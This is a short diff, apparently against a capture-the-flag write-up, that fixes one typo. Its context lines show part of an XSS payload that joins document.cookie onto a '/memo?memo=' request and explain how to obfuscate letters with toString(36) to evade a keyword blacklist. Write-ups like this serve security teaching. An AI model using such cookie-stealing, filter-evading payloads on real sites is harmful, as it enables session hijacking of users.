@@ -34,7 +34,7 @@ We can first split the payload into 2 parts, the `/memo` endpoint and the cookie
 [`/memo?memo=`,document.cookie].join(String(0).slice(0,0))
 ```
 
-`document.cookie` doesn't trigger the blacklist, so we only have to obfuscate the `/memo` enpdoint call. For alphabets, we can convert their ASCII value to strings using `toString(36)`.  
+`document.cookie` doesn't trigger the blacklist, so we only have to obfuscate the `/memo` endpoint call. For alphabets, we can convert their ASCII value to strings using `toString(36)`.  
 
 ```javascript
 (10).toString(36)   // "a"
